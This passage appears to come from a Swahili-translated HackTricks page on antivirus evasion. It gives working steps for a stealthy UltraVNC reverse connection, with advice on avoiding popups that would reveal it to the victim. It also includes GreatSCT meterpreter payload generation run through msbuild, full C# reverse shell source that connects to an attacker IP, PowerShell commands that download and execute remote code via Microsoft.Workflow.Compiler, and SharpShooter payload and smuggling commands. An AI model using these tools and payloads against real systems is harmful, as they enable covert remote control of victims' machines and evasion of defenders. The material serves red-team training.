
Kisha, hamasisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **mhasiriwa**

#### **Muunganisho wa kurudi**

**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata **muunganisho wa VNC** wa kurudi. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri huwezi kufanya mambo machache

- Usianze `winvnc` ikiwa tayari inaendesha au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika saraka sawa au itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usikimbie `winvnc -h` kwa msaada au utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** na `msfconsole -r file.rc` na **tekeleza** **xml payload** na:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atamaliza mchakato haraka sana.**

### Kuunda shell yetu ya nyuma

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Shell ya Kwanza ya C#

Ili kuunda, tumia:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kutumia kompyuta
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators wa C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

{{#include ../banners/hacktricks-training.md}}
